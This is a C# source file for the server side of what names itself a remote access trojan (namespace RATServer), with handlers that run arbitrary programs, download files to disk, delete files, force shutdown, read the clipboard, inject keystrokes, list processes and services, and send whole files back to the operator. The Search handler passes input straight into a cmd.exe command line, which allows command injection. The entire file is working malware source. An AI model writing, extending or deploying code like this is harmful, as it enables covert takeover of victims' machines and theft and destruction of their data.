using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.ServiceProcess;

namespace RATServer
{
    public class Functions
    {
        public static Response Message(string Msg)
        {
            Response r = new Response();
            MessageBox.Show(Msg);
            r.Type = "Message";
            r.Msg = "Message Success";
            return r;
        }
        public static Response Run(string Path)
        {
            Response r = new Response();
            Process.Start(Path);
            r.Type = "Message";
            r.Msg = "Run Success";
            return r;
        }
        public static Response PCInfo()
        {
            Response r = new Response();
            r.Type = "Message";
            r.Msg = "Details" + Environment.NewLine + "UserName: " + Environment.UserName + Environment.NewLine + "Machine Name: " + Environment.MachineName + Environment.NewLine + "OS: " + Environment.OSVersion.ToString() + Environment.NewLine + "UserDomainName: " + Environment.UserDomainName + Environment.NewLine + "Directory: " + Environment.CurrentDirectory;
            return r;
        }
        public static Response Processes()
        {
            Response r = new Response();
            r.Type = "Message";
            foreach (Process p in Process.GetProcesses()) r.Msg += p.ProcessName + Environment.NewLine;
            return r;
        }
        public static Response Delete(string Path)
        {
            Response r = new Response();
            r.Type = "Message";
            if (File.Exists(Path))
            {
                File.Delete(Path);
                r.Msg = "Delete Success";
            } else r.Msg = "File Not Found";
            return r;
        }
        public static Response Download(string IP, string Path)
        {
            Response r = new Response();
            r.Type = "Message";
            using (var c = new WebClient())
            {
                c.DownloadFile(IP, Path);
            }
            r.Msg = "Download Success";
            return r;
        }
        public static Response ShutDown()
        {
            Response r = new Response();
            r.Type = "Message";
            Process.Start("cmd.exe shutdown -s -f -t 00");
            r.Msg = "Shutdown Success";
            return r;
        }
        public static Response ClipBoard()
        {
            Response r = new Response();
            r.Type = "Message";
            r.Msg = Clipboard.GetText();
            return r;
        }
        public static Response KeyPress(string Keys)
        {
            Response r = new Response();
            r.Type = "Message";
            SendKeys.SendWait(Keys);
            r.Msg = "SendKeys Success";
            return r;
        }
        public static Response Retrieve(string Dir)
        {
            //issues with large files likely due to predetermined connection buffer size
            Response r = new Response();
            r.Type = "Data";
            r.Msg = Path.GetFileName(Dir);
            r.Data = File.ReadAllBytes(Dir);
            return r;
        }
        public static Response Services()
        {
            Response r = new Response();
            r.Type = "Message";
            ServiceController[] sc = ServiceController.GetServices();
            foreach (ServiceController s in sc) r.Msg += s.DisplayName + Environment.NewLine;
            return r;
        }
        public static Response Search(string Path)
        {
            Response r = new Response();
            r.Type = "Message";
            Process p = new Process();
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = "cmd.exe";
            p.StartInfo.Arguments = "/c dir " + Path;
            p.Start();
            r.Msg = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            return r;
        }
        public static Response ScreenShot()
        {
            //work in progress
            Response r = new Response();
            r.Type = "Data";
            //r.Msg = filename;
            //r.Data = data;
            return r;
        }
        public static Response Applications()
        {
            //work in progress
            Response r = new Response();
            r.Type = "Message";
            r.Msg = "Applications";
            return r;
        }
    }
}